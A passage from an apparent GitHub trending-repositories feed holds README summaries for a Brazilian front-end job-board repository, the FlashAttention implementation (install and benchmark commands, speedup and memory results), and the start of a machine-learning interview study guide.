EMPRESA]&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Informe quais &lt;em&gt;labels&lt;/em&gt; devemos adicionar, contendo o nível de experiência desejada e a forma de contração.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;⚠️ Importante&lt;/h3&gt; &#xA;&lt;p&gt;Com o objetivo de manter a qualidade das vagas postadas e respeitar todas as pessoas e empresas, &lt;strong&gt;NÃO ACEITAMOS&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Vagas sem o nome da empresa.&lt;/li&gt; &#xA; &lt;li&gt;Vagas de terceiros que não informem o nome da empresa na qual o(a) candidato(a) irá trabalhar.&lt;/li&gt; &#xA; &lt;li&gt;Vagas com informações faltantes e/ou fora do &lt;a href=&#34;https://raw.githubusercontent.com/frontendbr/vagas/main/.github/ISSUE_TEMPLATE/adicionar-nova-vaga.md&#34;&gt;modelo da issue&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Mais do que 2 (duas) vagas IGUAIS da mesma empresa POR MÊS.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;❗️ &lt;strong&gt;Caso algum desses itens seja infringido, a moderação poderá alertar na issue ou até mesmo a vaga poderá ser DELETADA sem aviso prévio.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;OBS.: Sabemos que é dificil controlar todas essas regras, portanto pedimos que nos ajudem e que tenham bom senso 😉&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Cuide da sua vaga ;)&lt;/h3&gt; &#xA;&lt;p&gt;Para evitar que possíveis candidatos enviem CVs para vagas já preenchidas, dê manutenção à sua issue, a cada 3 meses, coloque um comentário que continua procurando para a vaga ou feche a mesma comentando se a pessoa foi contratada através do nosso grupo ou por fora. Caso a issue passe de 3 meses e não tiver manutenção, a mesma poderá ser fechada por um moderador do repositório.&lt;/p&gt; &#xA;&lt;h3&gt;Como receber atualizações de novas vagas:&lt;/h3&gt; &#xA;&lt;p&gt;Você pode receber atualizações das vagas no seu email ou via notificações do Github, basta clicar em &lt;strong&gt;Watch&lt;/strong&gt; e, em seguida, clicar em &lt;strong&gt;Watching&lt;/strong&gt;, você pode modificar o modo de receber notificações em &lt;strong&gt;&lt;a href=&#34;https://github.com/settings/notifications&#34;&gt;notifications&lt;/a&gt;&lt;/strong&gt; no próprio Github.&lt;/p&gt; &#xA;&lt;h3&gt;Siga nosso Twitter &lt;img src=&#34;https://cloud.githubusercontent.com/assets/3603793/18564664/f0a4eb36-7b62-11e6-83f8-4eaebee644b0.png&#34; alt=&#34;Twitter&#34; width=&#34;30&#34;&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Todas as oportunidades serão automaticamente compartilhadas no &lt;a href=&#34;https://twitter.com/frontendbrvagas&#34;&gt;@frontendbrvagas&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Outros repositórios de vagas&lt;/h3&gt; &#xA;&lt;p&gt;Como esse repositório é específico para a postagem de vagas de &lt;strong&gt;front-end&lt;/strong&gt;, mas existem vagas para muitas outras áreas nesse mercado, algumas pessoas da comunidade forkaram esse repositório e criaram outras listas específicas para diferentes &lt;em&gt;stacks&lt;/em&gt; e estados do país. Confira abaixo as outras listas onde você poderá postar sua vaga:&lt;/p&gt; &#xA;&lt;h4&gt;Por área&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/backend-br/vagas&#34;&gt;Vagas para desenvolvedores Back-End&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/chatbotbr/vagas&#34;&gt;Vagas para desenvolvedores Chat-Bot&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/vagas&#34;&gt;Vagas para desenvolvedores Front-End&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/remotejobsbr/design-ux-vagas&#34;&gt;Vagas para UI/UX&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/qa-brasil/vagas&#34;&gt;Vagas para QAs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Por tecnologia&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/androiddevbr/vagas&#34;&gt;Vagas para desenvolvedores Android&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/CocoaHeadsBrasil/vagas&#34;&gt;Vagas para desenvolvedores iOS e OSX&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/phpdevbr/vagas&#34;&gt;Vagas para desenvolvedores PHP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pyjobs.com.br&#34;&gt;Vagas para desenvolvedores Python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vuejs-br/vagas&#34;&gt;Vagas para desenvolvedores Vue.js&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Gommunity/vagas&#34;&gt;Vagas para desenvolvedores Go/Golang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/flutter-brazil/vagas&#34;&gt;Vagas para Flutter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/react-brasil/vagas&#34;&gt;Vagas para React/React Native&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnetdevbr/vagas&#34;&gt;Vagas para desenvolvedores .NET&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rustdevbr/vagas&#34;&gt;Vagas para desenvolvedores Rust&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/FidelisClayton/elm-jobs&#34;&gt;Vagas para desenvolvedores Elm&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Por localidade&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/CangaceirosDevels/vagas_de_emprego&#34;&gt;Vagas para desenvolvedores no Ceará&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontend-ao/vagas&#34;&gt;Vagas para desenvolvedores Front-end (Angola)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/backend-ao/vagas&#34;&gt;Vagas para desenvolvedores Back-end (Angola)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontend-pt/vagas&#34;&gt;Vagas para desenvolvedores Front-end (Portugal)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/backend-pt/vagas&#34;&gt;Vagas para desenvolvedores Back-end (Portugal)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Licença&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/frontendbr/vagas/main/LICENSE&#34;&gt;MIT&lt;/a&gt; © FrontendBR&lt;/p&gt; &#xA;&lt;h2&gt;Repositórios da Front-End Brasil&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/forum&#34;&gt;Fórum&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/eventos&#34;&gt;Eventos&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/vagas&#34;&gt;Vagas&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/me-contrata&#34;&gt;Me Contrata&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/compra-e-venda&#34;&gt;Compra e Venda&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/doe-um-livro&#34;&gt;Doe um Livro&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/poste-mais&#34;&gt;Poste Mais!&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/open-source&#34;&gt;Open Source&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/frontendbr/sugestoes&#34;&gt;Sugestões&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>HazyResearch/flash-attention</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/HazyResearch/flash-attention</id>
    <link href="https://github.com/HazyResearch/flash-attention" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;FlashAttention&lt;/h1&gt; &#xA;&lt;p&gt;This repository provides the official implementation of FlashAttention from the following paper.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;FlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness&lt;/strong&gt;&lt;br&gt; Tri Dao, Daniel Y. Fu, Stefano Ermon, Atri Rudra, Christopher Ré&lt;br&gt; Paper: &lt;a href=&#34;https://arxiv.org/abs/2205.14135&#34;&gt;https://arxiv.org/abs/2205.14135&lt;/a&gt; &lt;img src=&#34;https://raw.githubusercontent.com/HazyResearch/flash-attention/main/assets/flashattn_banner.jpg&#34; alt=&#34;FlashAttention&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Alpha release (0.1).&lt;/h2&gt; &#xA;&lt;p&gt;To compile (requiring CUDA 11, NVCC, and an Ampere GPU):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python setup.py install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Interface: &lt;code&gt;src/flash_attention.py&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To run the benchmark against PyTorch standard attention:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PYTHONPATH=$PWD python benchmarks/benchmark_flash_attention.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;FlashAttention currently supports:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Ampere GPUs (e.g., A100, RTX 3090).&lt;/li&gt; &#xA; &lt;li&gt;fp16.&lt;/li&gt; &#xA; &lt;li&gt;Head dimensions 16, 32, 64.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Our tentative roadmap:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;[Jun 2022] Make package pip-installable.&lt;/li&gt; &#xA; &lt;li&gt;&lt;del&gt;[Jun 2022] Support SM86 GPUs (e.g., RTX 3080, 3090)&lt;/del&gt;[Done].&lt;/li&gt; &#xA; &lt;li&gt;[Jun 2022] Refactor to use Cutlass.&lt;/li&gt; &#xA; &lt;li&gt;[Jun 2022] Support SM75 GPUs (e.g. T4).&lt;/li&gt; &#xA; &lt;li&gt;[Jun 2022] Support bf16.&lt;/li&gt; &#xA; &lt;li&gt;[Jul 2022] Support head dimension 128.&lt;/li&gt; &#xA; &lt;li&gt;[Jul 2022] Support SM70 GPUs (V100).&lt;/li&gt; &#xA; &lt;li&gt;[Aug 2022] Fuse rotary embedding.&lt;/li&gt; &#xA; &lt;li&gt;[Aug 2022] Support Attention linear bias (e.g. ALiBi).&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Speedup and Memory Savings&lt;/h2&gt; &#xA;&lt;p&gt;We present expected speedup (combined forward + backward pass) and memory savings from using FlashAttention against PyTorch standard attention, depending on sequence length, on different GPUs (speedup depends on memory bandwidth - we see more speedup on slower GPU memory).&lt;/p&gt; &#xA;&lt;h3&gt;A100&lt;/h3&gt; &#xA;&lt;p&gt;We display FlashAttention speedup using these parameters (similar to BERT-base):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Batch size 8&lt;/li&gt; &#xA; &lt;li&gt;Head dimension 64&lt;/li&gt; &#xA; &lt;li&gt;12 attention heads&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Our graphs show sequence lengths between 128 and 4096 (when standard attention runs out of memory on an A100), but FlashAttention can scale up to sequence length 64K.&lt;/p&gt; &#xA;&lt;h4&gt;Speedup&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HazyResearch/flash-attention/main/assets/flashattn_speedup.jpg&#34; alt=&#34;FlashAttention speedup&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;We generally see 2-4X speedup at sequence lengths between 128 and 4K, and we see more speedup when using dropout and masking, since we fuse the kernels. At sequence lengths that are popular with language models like 512 and 1K, we see speedups up to 4X when using dropout and masking.&lt;/p&gt; &#xA;&lt;h4&gt;Memory&lt;/h4&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HazyResearch/flash-attention/main/assets/flashattn_memory.jpg&#34; alt=&#34;FlashAttention memory&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;We show memory savings in this graph (note that memory footprint is the same no matter if you use dropout or masking). Memory savings are proportional to sequence length -- since standard attention has memory quadratic in sequence length, whereas FlashAttention has memory linear in sequence length. We see 10X memory savings at sequence length 2K, and 20X at 4K. As a result, FlashAttention can scale to much longer sequence lengths.&lt;/p&gt; &#xA;&lt;h3&gt;RTX 3090&lt;/h3&gt; &#xA;&lt;p&gt;For the RTX 3090, we use batch size 12 with 12 attention heads. Memory savings are the same as on an A100, so we&#39;ll only show speedup here.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/HazyResearch/flash-attention/main/assets/flashattn_speedup_3090.jpg&#34; alt=&#34;FlashAttention speedup GTX 3090&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;We see slightly higher speedups (between 2.5-4.5x) on the GTX 3090, since memory bandwidth on the GDDR6X is lower than A100 HBM (~900 GB/s vs. ~1.5 TB/s).&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgments&lt;/h2&gt; &#xA;&lt;p&gt;Our implementation uses Apex&#39;s &lt;a href=&#34;https://github.com/NVIDIA/apex/tree/master/apex/contrib/csrc/fmha&#34;&gt;FMHA&lt;/a&gt; code as a starting point.&lt;/p&gt; &#xA;&lt;p&gt;We thank &lt;a href=&#34;https://yjk21.github.io/&#34;&gt;Young-Jun Ko&lt;/a&gt; for the in-depth explanation of his FMHA implementation and for his thoughtful answers to our questions about CUDA.&lt;/p&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;p&gt;If you use this codebase, or otherwise found our work valuable, please cite:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{dao2022flashattention,&#xA;  title={FlashAttention: Fast and Memory-Efficient Exact Attention with IO-Awareness},&#xA;  author={Dao, Tri and Fu, Daniel Y. and Ermon, Stefano and Rudra, Atri and R{\&#39;e}, Christopher},&#xA;  journal={arXiv preprint arXiv:2205.14135},&#xA;  year={2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>khangich/machine-learning-interview</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/khangich/machine-learning-interview</id>
    <link href="https://github.com/khangich/machine-learning-interview" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Machine Learning Interviews from FAANG, Snapchat, LinkedIn. I have offers from Snapchat, Coupang, Stitchfix etc. Blog: mlengineer.io.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Minimum Viable Study Plan for Machine Learning Interviews&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; Machine Learning System Design - Early Preview - &lt;a href=&#34;https://rebrand.ly/mldesignbook&#34;&gt; Buy on Amazon &lt;/a&gt;&lt;br&gt; &lt;a href=&#34;https://rebrand.ly/mldesignbook&#34;&gt; &lt;img src=&#34;https://miro.medium.com/max/1400/1*Te6wgTLFw9AD6r9D6sVNMg.png&#34; alt=&#34;Machine Learning System Design Interview&#34; width=&#34;400&#34; height=&#34;300&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; Machine Learning interviews book on Amazon.&lt;br&gt; &lt;a href=&#34;https://www.amazon.com/dp/B09S9JBT86&#34;&gt; &lt;img src=&#34;https://miro.medium.com/max/700/1*e3TitgWHyr6bO_bOWtP4Rg.png&#34; alt=&#34;Machine Learning Interviews book on Amazon&#34; width=&#34;400&#34; height=&#34;300&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Most popular post: &lt;a href=&#34;https://mlengineer.io/from-semiconductor-to-software-engineer-8c3126dde65b&#34;&gt;One lesson I learned after solving 500 leetcode questions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Oct 10th: Machine Learning System Design course became the &lt;a href=&#34;https://www.linkedin.com/posts/activity-6853724396188790784-tWxj&#34;&gt;number 1 ML course&lt;/a&gt; on educative.&lt;/li&gt; &#xA; &lt;li&gt;June 8th: launch &lt;a href=&#34;https://rebrand.ly/interviewstory&#34;&gt;interview stories series&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;April 29th: I launched &lt;a href=&#34;https://mlengineer.io/from-google-rejection-to-40-offers-71337a224ebe?sk=1408513db21536d25c23f67ce898b37d&#34;&gt;mlengineer.io&lt;/a&gt; blog so you can get latest machine learning interview experience.&lt;/li&gt; &#xA; &lt;li&gt;April 15th 2021: Machine Learning System Design is launched on &lt;a href=&#34;https://rebrand.ly/mldesigninterview&#34;&gt;interviewquery.com&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Feb 9th 2021: &lt;a href=&#34;https://rebrand.ly/mlsd_launch&#34;&gt;Machine Learning System design&lt;/a&gt; is now available on &lt;a href=&#34;https://rebrand.ly/mlsd_launch&#34;&gt;educative.io&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;I&#39;m a SWE, ML with 10 years of experience (&lt;a href=&#34;https://www.linkedin.com/in/phamkhang/&#34;&gt;Linkedin profile&lt;/a&gt;). I had offers from Google, LinkedIn, Coupang, Snap and StichFix. Read my &lt;a href=&#34;https://rebrand.ly/mleio&#34;&gt;blog&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Machine Learning Design&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Section&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;Youtube Recommendation&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/uc3.png&#34; alt=&#34;Youtube Recommendation Design&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;The main components in MLSD&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/ml.png&#34; alt=&#34;The main components in MLSD&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;3. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;LinkedIn Feed Ranking&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/feed.png&#34; alt=&#34;LinkedIn Feed Ranking&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;4. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;Ad Click Prediction&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/ads.png&#34; alt=&#34;Ad Click Prediction&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;5. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;Estimate Delivery time&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/delivery.png&#34; alt=&#34;Estimate Delivery time&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;6. &lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt;Airbnb Search ranking&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://rebrand.ly/mldesign&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/air.png&#34; alt=&#34;Airbnb Search ranking&#34; width=&#34;100&#34; height=&#34;100&#34;&gt; &lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;How to&lt;/th&gt; &#xA;   &lt;th&gt;Resources&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;List of promising companies&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://blog.wealthfront.com/career-launching-companies-list/#companies-list&#34;&gt;WealthFront 2021 list&lt;/a&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Prepare for interview&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/faqs.md&#34;&gt;Common questions about Machine Learning Interview process&lt;/a&gt;.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Study guide&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/README.md&#34;&gt;Study guide&lt;/a&gt; contained minimum set of focus area to aces your interview.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Design ML system&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mlengineer.io/machine-learning-design-interview-d08be9f44260?source=friends_link&amp;amp;sk=97fe3a510957d65b6311d5d38b30c639&#34;&gt;ML system design&lt;/a&gt; includes actual ML system design usecases.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ML usecases&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/appliedml.md&#34;&gt;ML usecases&lt;/a&gt; from top companies&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Test your ML knowledge&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mlengineer.io/machine-learning-assessment-db935aa9fafd?source=friends_link&amp;amp;sk=1062e407bea5d842b7684668b005d08c&#34;&gt;Machine Learning quiz&lt;/a&gt; are designed based on actual interview questions from dozen of big companies.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;One week before onsite interview&lt;/td&gt; &#xA;   &lt;td&gt;Read &lt;a href=&#34;https://mlengineer.io/machine-learning-engineer-onsite-interview-one-week-checklist-cfd19d57fa02?source=friends_link&amp;amp;sk=80d2bb43c590156a7fa72260dfb4972c&#34;&gt;one week check list&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;How to get offer?&lt;/td&gt; &#xA;   &lt;td&gt;Read &lt;a href=&#34;https://mlengineer.io/from-google-rejection-to-40-offers-71337a224ebe?source=friends_link&amp;amp;sk=1408513db21536d25c23f67ce898b37d&#34;&gt;success stories&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;FAANG companies actual MLE interviews&lt;/td&gt; &#xA;   &lt;td&gt;Read &lt;a href=&#34;https://mlengineer.io/mlengineer-io-interview/home&#34;&gt;interview stories&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Practice coding&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://mlengineer.io/common-leetcode-questions-by-categories-532b301130b&#34;&gt;Leetcode questions by categories for MLE&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Advance topics&lt;/td&gt; &#xA;   &lt;td&gt;Read &lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/extra.md&#34;&gt;advance topics&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Study guide&lt;/h2&gt; &#xA;&lt;h3&gt;LeetCode (not all companies ask Leetcode questions)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://docs.google.com/spreadsheets/d/1RCb1dVQCLmtOGlJ5J-NJ5pIC7Tda-N2U/edit#gid=274831950&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/LC.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;NOTE: there are a lot of companies that do &lt;strong&gt;NOT&lt;/strong&gt; ask leetcode questions. There are many paths to become an MLE, you can create your own path if you feel like leetcoding is a waste of time.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;I use &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1RCb1dVQCLmtOGlJ5J-NJ5pIC7Tda-N2U/edit#gid=274831950&#34;&gt;LC time tracking&lt;/a&gt; to keep track of how many times I solves a question and how long I spent each time. Once I finish non-trivial medium LC questions 3 times, I have absolutely no issues solving them in actual interviews (sometimes within 8-10 minutes). It makes a big difference. A better way is to use &lt;strong&gt;LeetPlug&lt;/strong&gt; chrome extension &lt;a href=&#34;https://leetplug.azurewebsites.net/static/pages/howto.html&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mlengineer.io/common-leetcode-questions-by-categories-532b301130b?sk=cf77975462cb0c96e6a6daebaa3ab7b9&#34;&gt;Leetcode questions by categories&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;SQL&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Know SQL join: &lt;a href=&#34;https://www.sqlservertutorial.net/sql-server-basics/sql-server-self-join/&#34;&gt;self join&lt;/a&gt;, inner, left, right etc.&lt;/li&gt; &#xA; &lt;li&gt;Use &lt;a href=&#34;https://www.hackerrank.com/domains/sql&#34;&gt;hackerrank&lt;/a&gt; to practice SQL.&lt;/li&gt; &#xA; &lt;li&gt;Revise/Learn SQL Window Functions: &lt;a href=&#34;https://www.windowfunctions.com/questions/intro/&#34;&gt;window functions&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Programming&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a 